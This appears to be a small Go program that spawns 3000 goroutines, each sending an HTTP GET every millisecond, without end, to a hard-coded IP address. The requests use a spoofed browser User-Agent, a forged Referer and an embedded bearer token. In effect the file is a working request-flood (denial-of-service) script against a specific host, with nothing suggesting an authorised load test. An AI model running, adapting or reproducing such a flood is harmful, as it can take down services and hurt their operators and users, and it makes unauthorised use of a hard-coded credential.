package main

import (
	"fmt"
	"net/http"
	"time"
)

func main() {
	// Create a new integer channel
	intChan := make(chan int)

	Send2(0)
	for i := 0; i < 3000; i++ {
		fmt.Printf("i: %v\n", i)

		go func() {
			for {

				Send2(0)

				time.Sleep(1*time.Millisecond)

			}
		}()
	}
	fmt.Printf("\"ppp\": %v\n", "ppp")

	<-intChan

}

func Send2(ij int) {

	client := &http.Client{}
	req, err := http.NewRequest("GET", "http://156.253.5.224/stat/us", nil)
	if err != nil {
		fmt.Printf("err: %v\n", err)

	}
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("mode", "no-cors")
	req.Header.Set("Referer", "http://156.253.5.224:4173/")
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiNjAwZjU0MS02MDA0LTQzYWQtOTMyMC03ODNkZGQwNGU0MDIiLCJleHAiOjE5NzAxNDQ4MTUzfQ.4CTrQ7bDQmOq6p-WglCwfQii4fgUsC04D5eYoDpQoW4")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	  client.Do(req)
 

}
